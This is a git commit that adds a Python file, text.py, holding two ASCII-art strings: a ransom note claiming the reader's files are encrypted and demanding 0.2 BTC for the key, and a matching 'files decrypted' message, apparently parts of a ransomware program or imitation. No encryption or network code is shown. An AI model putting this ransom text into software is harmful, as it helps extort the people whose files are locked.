09239d6dc63adff7ec6c8040ec4193e2c4566c85
zVeqsxy <85766366+zVeqsxy@users.noreply.github.com>
2023-06-30 15:33:20 +0200

    Added file text.py

---
+++ text.py
@@ -0,0 +1,18 @@
+hacked = """\n ________________________________________________________
+|							 |
+|							 |
+|	You have been hacked and all of your Files	 |
+|	have been encrypted. Send me 0.2 BTC to get	 |
+|		the Key to decrypt them.		 |
+|							 |
+|________________________________________________________|
+"""
+
+decrypted = """
+ _____________________________________
+|			   	      |
+|			   	      |
+|   Your files have been decrypted.   |
+|			   	      |
+|_____________________________________|
+"""
